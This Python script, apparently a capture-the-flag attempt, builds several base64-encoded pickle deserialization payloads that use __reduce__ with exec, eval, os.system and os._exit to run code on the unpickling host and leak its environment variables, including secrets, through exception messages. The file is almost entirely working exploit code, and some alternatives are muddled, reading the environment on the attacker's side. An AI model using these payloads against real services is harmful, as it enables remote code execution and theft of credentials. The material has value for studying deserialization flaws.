import pickle
import base64

# Approach 1: Use subprocess to run a command that fails
class Payload1:
    def __reduce__(self):
        import subprocess
        # This will run a command that uses os.environ
        return (subprocess.run, (['echo', '${FLAG:-' + str(__import__('os').environ) + '}']),)

# Approach 2: Use eval with 1/0 to raise ZeroDivisionError containing FLAG
class Payload2:
    def __reduce__(self):
        # Use a lambda or function that raises an exception
        return (eval, ('1/0 and __import__("os").environ',))

# Approach 3: Use a function that doesn't exist - cause AttributeError with FLAG in message
class Payload3:
    def __reduce__(self):
        env = str(__import__('os').environ)
        # Try to call a method that doesn't exist on a built-in
        return (getattr, (1, env))  # This will fail because 1 doesn't have that attribute

# Approach 4: Use __builtins__.exec to raise an exception
class Payload4:
    def __reduce__(self):
        code = """
import os
env = dict(os.environ)
raise Exception(f"FLAG ENV: {env}")
"""
        return (exec, (code,))

# Approach 5: Use int() with invalid base - but need parameter
class Payload5:
    def __reduce__(self):
        # int() requires string and base
        return (int, (str(__import__('os').environ), 37))  # base 37 should fail

# Approach 6: Use open with non-existent file containing FLAG
class Payload6:
    def __reduce__(self):
        return (__import__('os')._exit, (1,))  # Exit with code, might reveal something

# Approach 7: Force a NameError or similar
class Payload7:
    def __reduce__(self):
        return (eval, ('__import__("os").system("echo FLAG>")',))

# Test each payload
print("Testing payloads locally...") 

for i, payload_cls in enumerate([Payload1, Payload2, Payload3, Payload4, Payload5, Payload6, Payload7], 1):
    try:
        p = payload_cls()
        pickled = pickle.dumps(p, protocol=4)
        encoded = base64.b64encode(pickled).decode()
        print(f"\n[*] Payload {i} (base64): {encoded}")
        # Don't test locally as some might exit the process
    except Exception as e:
        print(f"[*] Payload {i} creation error: {e}")

# Let's try a simple and direct approach: exec that imports os and raises exception
print("\n" + "="*60)
print("Creating direct exec payload with FLAG...")

class DirectPayload:
    def __reduce__(self):
        return (__import__('builtins').exec, ("import os; raise Exception(str(dict(os.environ)))",))

payload = DirectPayload()
pickled = pickle.dumps(payload, protocol=4)
encoded = base64.b64encode(pickled).decode()

print(f"\n[*] FINAL PAYLOAD (exec + raise):")
print(f"{encoded}")

# Test it
try:
    result = pickle.loads(pickled)
    print(f"Test result: {result}")
except Exception as e:
    print(f"Test exception (expected): {type(e).__name__}: {e}")

